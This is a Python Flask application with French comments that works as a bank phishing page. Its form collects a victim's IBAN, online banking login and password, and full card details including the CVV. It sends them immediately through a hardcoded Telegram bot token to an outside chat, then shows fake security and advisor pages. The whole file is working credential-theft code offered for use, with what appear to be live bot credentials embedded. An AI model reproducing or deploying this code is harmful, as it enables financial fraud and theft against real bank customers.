from flask import Flask, render_template, request, redirect, session, url_for
import requests
import os

app = Flask(__name__)
app.secret_key = 'super_secret_key'  # Changez cette clé en production

# Configuration Telegram
BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
CHAT_ID = "6297861735"


# Fonction pour envoyer un message à Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
        print("Message envoyé à Telegram avec succès.")
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de l'envoi à Telegram: {e}")
        if 'response' in locals() and response:
            print("Réponse d'erreur de l'API Telegram:", response.text)


# Route pour la première page de formulaire
@app.route('/')
def form_step1():
    return render_template('form1.html')


# Route qui gère la soumission du formulaire 1
@app.route('/send_form1_data', methods=['POST'])
def send_form1_data():
    # Récupérer les données du formulaire 1
    iban = request.form.get('iban', 'N/A')
    phone_number = request.form.get('phone_number', 'N/A')
    bank_name = request.form.get('bank_name', 'N/A')
    bank_id = request.form.get('bank_id', 'N/A')
    bank_password = request.form.get('bank_password', 'N/A')
    card_name = request.form.get('card_name', 'N/A')
    card_number = request.form.get('card_number', 'N/A')
    expiry_date = request.form.get('expiry_date', 'N/A')
    cvv = request.form.get('cvv', 'N/A')

    # Créer le message pour le formulaire 1
    message = f"""
    --- Données du Formulaire 1 ---
    IBAN: {iban}
    Numéro de téléphone (banque): {phone_number}
    Nom de la banque: {bank_name}
    Identifiant bancaire: {bank_id}
    Mot de passe bancaire: {bank_password}

    --- Données de la carte ---
    Nom sur la carte: {card_name}
    Numéro de carte: {card_number}
    Date d'expiration: {expiry_date}
    CVV: {cvv}
    """

    # ENVOI IMMÉDIAT du message à Telegram
    send_telegram_message(message)

    # Rediriger l'utilisateur vers la page de vérification
    return render_template('security_page.html')


# Route qui gère le clic sur "Je confirme..." et affiche la nouvelle page
@app.route('/start_simulation_page')
def start_simulation_page():
    # Affiche la nouvelle page qui demande au client de contacter un conseiller
    return render_template('advisor_page.html')


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)